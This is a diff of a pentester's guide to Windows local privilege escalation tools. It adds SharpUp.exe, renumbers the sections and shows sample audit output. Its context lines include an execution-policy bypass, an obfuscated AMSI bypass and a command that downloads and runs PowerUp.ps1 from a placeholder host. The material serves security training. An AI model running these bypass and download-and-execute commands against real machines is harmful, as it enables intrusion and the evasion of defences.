@@ -1,13 +1,14 @@
 ======================================================================================================================
-Windows Privilege Escalation Scripts & Techniques
+Windows Privilege Escalation Scripts, Tools & Techniques
 ======================================================================================================================
 
-There are numerous scripts that are useful to enumerate a Windows machine and find local privilege escalation flaws such as:
-- PowerUP.ps1
-- PrivescCheck.ps1
-- Privesc.ps1
-- JAWS.ps1
-- WinPEAS.bat
+There are numerous scripts and tools that are useful to enumerate a Windows machine and find local privilege escalation flaws such as:
+1. PowerUP.ps1
+2. SharpUp.exe
+3. PrivescCheck.ps1
+4. Privesc.ps1
+5. JAWS.ps1
+6. WinPEAS.bat
 - ...
 
 How to detect and exploit Windows local privilege escalation vulnerabilities:
@@ -49,7 +50,7 @@ PS C:\> powershell -ep bypass
 
 PS C:\Users\studentuser> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYp <SNIP>     //Bypass AMSI
 
-PS C:\> iex (New-Object Net.WebClient).DownloadString('http://XX.XX.XX.XX/PowerUp.ps1')        //we could have also download locally an obfusctaed version PoerUp.ps1 and then import it ('import-module .\PowerUp.ps1')
+PS C:\> iex (New-Object Net.WebClient).DownloadString('http://XX.XX.XX.XX/PowerUp.ps1')        //we could have also downloaded locally an obfuscated/encrypted version of PowerUp.ps1 and then import it ('import-module .\PowerUp.ps1')
 
 PS C:\> invoke-allchecks
 
@@ -155,7 +156,36 @@ UnattendPath : C:\Windows\Panther\Unattend.xml
 
 
 ======================================================================================================================
-2. PrivescCheck script
+2. SharpUp.exe
+======================================================================================================================
+
+Github links: 
+> https://github.com/GhostPack/SharpUp
+> https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpUp.exe
+
+SharpUp is a C# port of various PowerUp functionality. Currently, only the most common checks have been ported and no weaponization functions 
+have yet been implemented.
+
+
+Example - Output of the tool SharpUp.exe run on a vulnerable Windows 10 laptop with a low-privileged user
+======================================================================================================================
+
+PS C:\Users\pentester> SharpUp.exe audit
+
+=== SharpUp: Running Privilege Escalation Checks ===
+[!] Modifialbe scheduled tasks were not evaluated due to permissions.
+
+=== Modifiable Folders in %PATH% ===
+        C:\Python27
+        C:\metasploit-framework\bin\
+
+[*] Completed Privesc Checks in 12 seconds
+
+PS C:\Users\pentester>
+
+
+======================================================================================================================
+3. PrivescCheck script
 ======================================================================================================================
 
 Github links: 
@@ -1045,7 +1075,7 @@ PS C:\Users\backup\Documents>
 
 
 ======================================================================================================================
-3. Privesc script
+4. Privesc script
 ======================================================================================================================
 
 > Github link: https://github.com/enjoiz/Privesc
@@ -1213,7 +1243,7 @@ PS C:\Users\backup\Documents>
 
 
 ======================================================================================================================
-4. JAWS script
+5. JAWS script
 ======================================================================================================================
 
 JAWS - Just Another Windows (Enum) Script
@@ -2135,7 +2165,7 @@ PS C:\Users\backup\Documents>
 
 
 ======================================================================================================================
-5. WinPEAS script
+6. WinPEAS script
 ======================================================================================================================
 
 Privilege escalation tools for Windows and Linux/Unix* and MacOS.
@@ -3175,3 +3205,5 @@ C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6
 
 ---
 Scan complete.
+
+
